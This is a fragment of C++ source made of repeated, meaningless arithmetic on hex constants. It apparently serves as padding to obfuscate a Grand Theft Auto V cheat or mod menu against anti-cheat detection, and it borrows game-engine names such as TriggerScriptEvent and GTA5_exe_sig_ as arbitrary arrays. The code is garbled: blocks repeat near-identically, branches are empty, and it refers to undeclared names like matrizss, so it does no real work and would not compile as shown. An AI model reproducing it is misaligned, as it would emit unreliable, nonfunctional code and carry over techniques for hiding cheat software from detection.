			TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			Extern_Reader::INIFile::String::GravarString("", buffer, "Modelo");

			if (offset > aaaaaa)
			{
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = ponteiro * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
			offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (matriz[1] > aaaaaa)
			{
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			a = 0.0f;
			b = 0.0f;
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = 0xB2 * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
			matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
			matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			if (matriz[1] > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			a = 0.0f;
			b = 0.0f;
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
			GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (5) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			a = 0.0f;
			b = 0.0f;
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
